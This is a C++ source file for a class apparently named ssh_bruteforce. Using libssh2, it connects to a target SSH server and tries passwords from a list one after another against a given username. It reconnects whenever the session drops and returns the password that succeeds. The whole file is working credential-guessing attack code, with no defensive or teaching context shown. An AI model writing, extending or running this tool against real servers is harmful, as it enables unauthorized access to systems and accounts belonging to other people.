#include "ssh_bruteforce.h"

#include <unistd.h>
#include <arpa/inet.h>
#include <stdio.h>

ssh_bruteforce::ssh_bruteforce(char *info[]) {
    this->hostaddr = inet_addr(info[0]);
    this->port = info[1];
    this->username = info[2];
}

ssh_bruteforce::~ssh_bruteforce() {
}

std::string ssh_bruteforce::bruteforce() {
    int rc, sock;
    struct sockaddr_in sin;
    LIBSSH2_SESSION *session;

    rc = libssh2_init(0);
    if (rc != 0) {
        fprintf (stderr, "libssh2 initialization failed (%d)\n", rc);
        return "";
    }

    while (true) { //we're looping everythign because the ssh session can and will die after few login tries
        sock = socket(AF_INET, SOCK_STREAM, 0);
        sin.sin_family = AF_INET;
        sin.sin_port = htons(stoi(port));
        sin.sin_addr.s_addr = hostaddr;

        if (connect(sock, (struct sockaddr*)(&sin), sizeof(struct sockaddr_in)) != 0) {
            fprintf(stderr, "Failed to connect!\n");
            return "";
        }

        session = libssh2_session_init();
        if (libssh2_session_handshake(session, sock)) {
            fprintf(stderr, "Failure establishing SSH session\n");
            return "";
        }

        if (libssh2_userauth_password(session, username.c_str(), passwords[0].c_str())) {
            passwords.erase(passwords.begin(), passwords.begin() + 1); //remove the last used password

            if (passwords.size() == 0) {
                clean(&session, &sock);
                libssh2_exit();
                return "";
            }
        } else {
            std::cout << "Found it" << std::endl;
            clean(&session, &sock);
            libssh2_exit();
            return passwords[0];
        }

        clean(&session, &sock);
    }
}

void ssh_bruteforce::clean(LIBSSH2_SESSION **session, int *sock) {
    libssh2_session_disconnect(*session, "Normal Shutdown, Thank you for playing");
    libssh2_session_free(*session);
    close(*sock);
}
